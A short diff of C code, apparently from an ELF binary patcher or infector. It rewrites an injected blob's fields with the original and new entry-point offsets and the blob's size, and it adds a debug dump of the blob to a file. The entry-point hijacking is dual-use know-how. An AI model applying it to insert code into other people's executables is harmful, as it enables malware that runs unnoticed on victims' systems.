@@ -28,13 +28,14 @@ void update(char *b, size_t n, size_t old_entry, size_t entry){
 	//add a few information about himself
     Elf64_Ehdr *bh = (void*)b;
 	size_t pos = elf_offset_entry(b, n);
-
+	int DATA = 0x1b;
+	int JMP = 0x51;
 	//modifying 2bit after
-	((size_t*)((char*)(b + pos + 2)))[0] = entry - pos;
+	((size_t*)((char*)(b + pos + DATA)))[0] = max(old_entry,entry+JMP) - min(old_entry,entry+JMP);
+	((size_t*)((char*)(b + pos + DATA)))[1] = entry - pos;
 	//printf("diff: %zx, size: %zx\n", entry - pos, n);
-	((size_t*)((char*)(b + pos + 2)))[1] = n;
+	((size_t*)((char*)(b + pos + DATA)))[2] = n;
 	//move to next entry
-	((u32*)((char*)(b + pos + 0x4a)))[0] = old_entry;
 }
 
 static size_t _prepare(char **s, size_t *n, char *b, size_t bn){
@@ -63,6 +64,9 @@ static size_t _prepare(char **s, size_t *n, char *b, size_t bn){
 	elf_shift_offset(*s, *n, pos, bn+diff);
     h = (void*)*s;
 	update((*s) + pos + 1, bn, old_entry, h->e_entry);
+	//DEBUG
+	println("DEBUG: save to l.vi");
+	fput("l.vi", (*s) + pos + 1, bn);
 	return pos;
 }
 
